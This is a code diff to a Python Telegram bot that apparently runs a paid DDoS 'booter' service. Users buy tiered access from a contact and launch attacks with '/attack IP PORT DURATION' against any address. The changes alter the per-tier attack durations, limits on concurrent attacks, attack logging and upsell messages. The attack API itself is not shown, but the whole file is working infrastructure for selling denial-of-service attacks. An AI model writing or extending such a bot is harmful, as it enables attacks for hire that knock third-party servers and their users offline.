@@ -34,10 +34,11 @@ MAX_CONCURRENT_ATTACKS = 4
 BLOCKED_PORTS = {8700, 20000, 443, 17500, 9031, 20002, 20001}
 MIN_PORT, MAX_PORT = 1, 65535
 
+# TIER DURATION LIMITS (in seconds)
 TIER_LIMITS = {
-    "free": {"min": 1, "max": 60},
-    "premium": {"min": 60, "max": 600},
-    "vip": {"min": 60, "max": 900}
+    "free": {"min": 1, "max": 60},      # Free users: up to 60 seconds
+    "premium": {"min": 1, "max": 180},   # Premium: up to 180 seconds
+    "vip": {"min": 1, "max": 300}        # VIP: up to 300 seconds
 }
 DEFAULT_TIER = "free"
 
@@ -68,7 +69,6 @@ class Database:
         self.users = self.db.users
         self.attacks = self.db.attacks
         try:
-            # Clean up any null or missing user_id
             self.users.delete_many({"user_id": None})
             self.users.delete_many({"user_id": {"$exists": False}})
             self.users.drop_indexes()
@@ -90,47 +90,31 @@ class Database:
         return user
 
     def create_user(self, user_id: int, username: str = None) -> Dict:
-        existing = self.get_user(user_id)
-        if existing:
-            return existing
+        if self.get_user(user_id): return self.get_user(user_id)
         user_data = {
-            "user_id": user_id,
-            "username": username,
-            "approved": False,
-            "approved_at": None,
-            "expires_at": None,
-            "total_attacks": 0,
-            "created_at": get_current_time(),
-            "is_banned": False,
-            "tier": DEFAULT_TIER
+            "user_id": user_id, "username": username, "approved": False,
+            "approved_at": None, "expires_at": None, "total_attacks": 0,
+            "created_at": get_current_time(), "is_banned": False, "tier": DEFAULT_TIER
         }
         try:
             self.users.insert_one(user_data)
-            logger.info(f"Created user {user_id}")
-        except pymongo.errors.DuplicateKeyError:
-            pass
+            logger.info(f"Created user {user_id} with tier {DEFAULT_TIER}")
+        except: pass
         return user_data
 
     def approve_user(self, user_id: int, days: int) -> bool:
         expires_at = get_current_time() + timedelta(days=days)
-        result = self.users.update_one(
-            {"user_id": user_id},
-            {"$set": {"approved": True, "approved_at": get_current_time(), "expires_at": expires_at}}
-        )
-        return result.modified_count > 0
+        res = self.users.update_one({"user_id": user_id}, {"$set": {"approved": True, "approved_at": get_current_time(), "expires_at": expires_at}})
+        return res.modified_count > 0
 
     def disapprove_user(self, user_id: int) -> bool:
-        result = self.users.update_one(
-            {"user_id": user_id},
-            {"$set": {"approved": False, "expires_at": None}}
-        )
-        return result.modified_count > 0
+        res = self.users.update_one({"user_id": user_id}, {"$set": {"approved": False, "expires_at": None}})
+        return res.modified_count > 0
 
     def set_user_tier(self, user_id: int, tier: str) -> bool:
-        if tier not in TIER_LIMITS:
-            return False
-        result = self.users.update_one({"user_id": user_id}, {"$set": {"tier": tier}})
-        return result.modified_count > 0
+        if tier not in TIER_LIMITS: return False
+        res = self.users.update_one({"user_id": user_id}, {"$set": {"tier": tier}})
+        return res.modified_count > 0
 
     def get_user_tier(self, user_id: int) -> str:
         u = self.get_user(user_id)
@@ -138,29 +122,19 @@ class Database:
 
     def log_attack(self, user_id: int, ip: str, port: int, duration: int, status: str, response: str = None):
         self.attacks.insert_one({
-            "_id": str(uuid.uuid4()),
-            "user_id": user_id,
-            "ip": ip,
-            "port": port,
-            "duration": duration,
-            "status": status,
-            "response": response[:500] if response else None,
+            "_id": str(uuid.uuid4()), "user_id": user_id, "ip": ip, "port": port,
+            "duration": duration, "status": status, "response": response[:500] if response else None,
             "timestamp": get_current_time()
         })
         self.users.update_one({"user_id": user_id}, {"$inc": {"total_attacks": 1}})
 
     def get_all_users(self) -> List[Dict]:
-        # Always exclude null/missing user_id
         users = list(self.users.find({"user_id": {"$ne": None, "$exists": True}}))
         for u in users:
-            if u.get("created_at"):
-                u["created_at"] = make_aware(u["created_at"])
-            if u.get("approved_at"):
-                u["approved_at"] = make_aware(u["approved_at"])
-            if u.get("expires_at"):
-                u["expires_at"] = make_aware(u["expires_at"])
-            if "tier" not in u:
-                u["tier"] = DEFAULT_TIER
+            if u.get("created_at"): u["created_at"] = make_aware(u["created_at"])
+            if u.get("approved_at"): u["approved_at"] = make_aware(u["approved_at"])
+            if u.get("expires_at"): u["expires_at"] = make_aware(u["expires_at"])
+            if "tier" not in u: u["tier"] = DEFAULT_TIER
         return users
 
     def get_user_attack_stats(self, user_id: int) -> Dict:
@@ -169,8 +143,7 @@ class Database:
         failed = self.attacks.count_documents({"user_id": user_id, "status": "failed"})
         recent = list(self.attacks.find({"user_id": user_id}).sort("timestamp", -1).limit(10))
         for a in recent:
-            if a.get("timestamp"):
-                a["timestamp"] = make_aware(a["timestamp"])
+            if a.get("timestamp"): a["timestamp"] = make_aware(a["timestamp"])
         return {"total": total, "successful": success, "failed": failed, "recent": recent}
 
 db = Database()
@@ -182,13 +155,13 @@ async def is_member_of_access_group(user_id: int, context: ContextTypes.DEFAULT_
         member = await context.bot.get_chat_member(chat.id, user_id)
         return member.status in [ChatMember.MEMBER, ChatMember.ADMINISTRATOR, ChatMember.OWNER]
     except Exception as e:
-        logger.error(f"Group access check failed: {e}")
+        logger.error(f"Access check failed: {e}")
         return False
 
 async def require_access(update: Update, context: ContextTypes.DEFAULT_TYPE) -> bool:
     user_id = update.effective_user.id
     if user_id in ADMIN_IDS:
-        return True  # Admins always bypass group check
+        return True
     if not await is_member_of_access_group(user_id, context):
         await update.message.reply_text(f"❌ Access denied. You must join @{ACCESS_GROUP_USERNAME} to use {BOT_NAME}.\n\n💸 Want to buy? DM {CONTACT}")
         return False
@@ -196,11 +169,9 @@ async def require_access(update: Update, context: ContextTypes.DEFAULT_TYPE) -> 
 
 async def is_user_approved(user_id: int) -> bool:
     u = db.get_user(user_id)
-    if not u or not u.get("approved"):
-        return False
+    if not u or not u.get("approved"): return False
     exp = u.get("expires_at")
-    if exp and make_aware(exp) < get_current_time():
-        return False
+    if exp and make_aware(exp) < get_current_time(): return False
     return True
 
 # ---------- API Functions ----------
@@ -237,15 +208,13 @@ def admin_required(func):
         return await func(update, context, *args, **kwargs)
     return wrapper
 
-# ---------- Admin Commands (no /admin command) ----------
+# ---------- Admin Commands ----------
 @admin_required
 async def approve_command(update, context):
     try:
         uid = int(context.args[0])
         days = int(context.args[1])
-        if days <= 0:
-            raise ValueError
-        # Ensure user exists
+        if days <= 0: raise ValueError
         if not db.get_user(uid):
             db.create_user(uid, username=None)
         if db.approve_user(uid, days):
@@ -254,7 +223,7 @@ async def approve_command(update, context):
             try:
                 await context.bot.send_message(uid, f"✅ You have been approved for {days} days! Use /help")
             except:
-                await update.message.reply_text("⚠️ User approved but could not notify (they haven't started the bot).")
+                await update.message.reply_text("⚠️ User approved but could not notify.")
         else:
             await update.message.reply_text("❌ Approval failed.")
     except:
@@ -271,12 +240,13 @@ async def disapprove_command(update, context):
             except:
                 pass
         else:
-            await update.message.reply_text("❌ User not found or already disapproved.")
+            await update.message.reply_text("❌ User not found.")
     except:
         await update.message.reply_text("Usage: /disapprove <user_id>")
 
 @admin_required
 async def set_tier_command(update, context):
+    """Set user tier: /set_tier <user_id> <free|premium|vip>"""
     try:
         uid = int(context.args[0])
         tier = context.args[1].lower()
@@ -284,9 +254,9 @@ async def set_tier_command(update, context):
             raise ValueError
         if db.set_user_tier(uid, tier):
             limits = TIER_LIMITS[tier]
-            await update.message.reply_text(f"✅ User {uid} tier set to {tier.upper()} (duration {limits['min']}-{limits['max']}s)")
+            await update.message.reply_text(f"✅ User {uid} tier set to {tier.upper()} (max {limits['max']} seconds)")
             try:
-                await context.bot.send_message(uid, f"🔄 Your tier has been updated to {tier.upper()}! Duration: {limits['min']}-{limits['max']}s")
+                await context.bot.send_message(uid, f"🔄 Your tier has been updated to {tier.upper()}! Max duration: {limits['max']}s")
             except:
                 pass
         else:
@@ -346,7 +316,6 @@ async def start_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     username = update.effective_user.username
     if not await require_access(update, context):
         return
-    # Create or update user (ensure they exist in DB)
     user = db.create_user(user_id, username)
     if await is_user_approved(user_id):
         tier = user.get("tier", "free")
@@ -355,14 +324,12 @@ async def start_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
         days_left = max(0, (make_aware(expires) - get_current_time()).days) if expires else 0
         msg = (f"🔥 Welcome to {BOT_NAME} 🔥\n\n"
                f"👤 User: {username}\n"
-               f"⭐ Tier: {tier.upper()} ({limits['min']}-{limits['max']}s)\n"
+               f"⭐ Tier: {tier.upper()} (max {limits['max']} seconds)\n"
                f"📅 Expires: {days_left} days\n\n"
                f"Commands:\n/attack IP PORT DURATION\n/myinfo\n/mystats\n/myattacks\n/blockedports\n/help\n\n"
-               f"💸 Want to buy access? DM {CONTACT}")
+               f"💸 Want to upgrade? DM {CONTACT}")
     else:
-        msg = (f"❌ Access Denied, {username}!\n\n"
-               f"Your account is not approved yet (or expired).\n"
-               f"💸 To purchase access, DM {CONTACT}")
+        msg = (f"❌ Access Denied, {username}!\n\nYour account is not approved or expired.\n💸 Purchase: DM {CONTACT}")
     await update.message.reply_text(msg)
 
 async def attack_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
@@ -370,12 +337,13 @@ async def attack_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if not await require_access(update, context):
         return
     if not await is_user_approved(user_id):
-        await update.message.reply_text(f"❌ Your account is not approved or expired. Contact {CONTACT} to purchase.")
+        await update.message.reply_text(f"❌ Account not approved. Contact {CONTACT} to purchase.")
         return
 
+    # Check concurrent attacks
     active = get_active_attacks()
     if active.get("success") and active.get("count", 0) >= MAX_CONCURRENT_ATTACKS:
-        await update.message.reply_text(f"❌ Max concurrent attacks ({MAX_CONCURRENT_ATTACKS}) reached. Wait a moment.")
+        await update.message.reply_text(f"❌ Max concurrent attacks ({MAX_CONCURRENT_ATTACKS}) reached. Wait.")
         return
 
     args = context.args
@@ -389,6 +357,7 @@ async def attack_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if not ip_pattern.match(ip):
         await update.message.reply_text("❌ Invalid IP address.")
         return
+    # Validate port
     try:
         port = int(port_str)
         if port < MIN_PORT or port > MAX_PORT or is_port_blocked(port):
@@ -396,15 +365,20 @@ async def attack_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     except:
         await update.message.reply_text(f"Invalid/blocked port. Allowed: {MIN_PORT}-{MAX_PORT} except {get_blocked_ports_list()}")
         return
+    # Validate duration based on user's tier
     try:
         duration = int(dur_str)
         tier = db.get_user_tier(user_id)
         limits = TIER_LIMITS[tier]
         if duration < limits["min"] or duration > limits["max"]:
-            await update.message.reply_text(f"Duration {duration}s not allowed for {tier.upper()} tier. Allowed: {limits['min']}-{limits['max']}s")
+            await update.message.reply_text(
+                f"❌ Duration {duration}s exceeds your tier ({tier.upper()}).\n"
+                f"Max allowed: {limits['max']}s.\n"
+                f"💸 Upgrade to increase limit: DM {CONTACT}"
+            )
             return
     except:
-        await update.message.reply_text("Invalid duration.")
+        await update.message.reply_text("❌ Invalid duration.")
         return
 
     msg = await update.message.reply_text(f"🎯 Launching attack {ip}:{port} for {duration}s...")
@@ -452,7 +426,7 @@ async def myinfo_command(update, context):
     msg = (f"📋 {BOT_NAME} - Your Info\n"
            f"🆔 ID: {user['user_id']}\n"
            f"👤 @{user.get('username', 'N/A')}\n"
-           f"⭐ Tier: {tier.upper()} ({limits['min']}-{limits['max']}s)\n"
+           f"⭐ Tier: {tier.upper()} (max {limits['max']}s)\n"
            f"{status}\n📅 Expires: {expires_str}\n"
            f"🎯 Total attacks: {user.get('total_attacks',0)}\n\n"
            f"💸 Upgrade: DM {CONTACT}")
@@ -473,7 +447,6 @@ async def blockedports_command(update, context):
     await update.message.reply_text(f"🚫 Blocked ports: {get_blocked_ports_list()}\nAllowed: {MIN_PORT}-{MAX_PORT} except those.\n\n💸 DM {CONTACT} for custom unlocks.")
 
 async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    # Only user commands shown – no admin commands listed
     if not await require_access(update, context):
         return
     msg = (
@@ -486,7 +459,10 @@ async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
         "/blockedports – List blocked ports\n"
         "/start – Welcome message\n"
         "/help – This menu\n\n"
-        f"⭐ **Tiers:**\n• Free: 1-60s\n• Premium: 60-600s\n• VIP: 60-900s\n\n"
+        f"⭐ **Tiers & Maximum Duration:**\n"
+        f"• Free: 60 seconds\n"
+        f"• Premium: 180 seconds\n"
+        f"• VIP: 300 seconds\n\n"
         f"📡 Max concurrent attacks: {MAX_CONCURRENT_ATTACKS}\n\n"
         f"💸 Want to buy or upgrade? DM {CONTACT}"
     )
@@ -501,7 +477,7 @@ async def error_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
 # ---------- Main ----------
 def main():
     app = Application.builder().token(BOT_TOKEN).build()
-    # Admin commands (no separate /admin command)
+    # Admin commands
     app.add_handler(CommandHandler("approve", approve_command))
     app.add_handler(CommandHandler("disapprove", disapprove_command))
     app.add_handler(CommandHandler("set_tier", set_tier_command))
@@ -521,7 +497,7 @@ def main():
 
     app.add_error_handler(error_handler)
 
-    print(f"{BOT_NAME} is starting... (Admin commands available but not listed in /help)")
+    print(f"{BOT_NAME} is starting... (Tiers: Free 60s, Premium 180s, VIP 300s)")
     app.run_polling()
 
 if __name__ == "__main__":
